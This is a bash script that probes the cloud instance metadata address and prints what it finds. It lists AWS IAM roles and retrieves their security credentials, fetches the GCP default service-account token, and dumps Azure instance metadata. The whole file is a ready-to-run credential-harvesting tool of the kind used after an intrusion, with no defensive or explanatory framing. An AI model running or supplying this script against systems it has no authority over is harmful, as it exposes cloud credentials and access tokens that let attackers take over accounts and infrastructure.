#!/bin/bash
# -----------------------------------------------------------------------------
# Enumerates cloud metadata services (AWS, GCP, Azure) to retrieve instance
# information and credentials.
# -----------------------------------------------------------------------------

METADATA_IP="169.254.169.254"
TIMEOUT=2

# Check connectivity
if ping -c 1 -W 1 "$METADATA_IP" >/dev/null 2>&1; then
    # AWS Metadata Root
    curl -s --max-time $TIMEOUT "http://$METADATA_IP/latest/meta-data/" 2>/dev/null | head -n 10

    # AWS IAM Credentials
    curl -s --max-time $TIMEOUT "http://$METADATA_IP/latest/meta-data/iam/security-credentials/" 2>/dev/null | while read role; do
        echo "AWS Role: $role"
        curl -s --max-time $TIMEOUT "http://$METADATA_IP/latest/meta-data/iam/security-credentials/$role" 2>/dev/null
    done

    # GCP Token
    curl -s --max-time $TIMEOUT -H "Metadata-Flavor: Google" "http://$METADATA_IP/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null

    # Azure Instance Metadata
    curl -s --max-time $TIMEOUT -H "Metadata: true" "http://$METADATA_IP/metadata/instance?api-version=2021-02-01" 2>/dev/null
fi
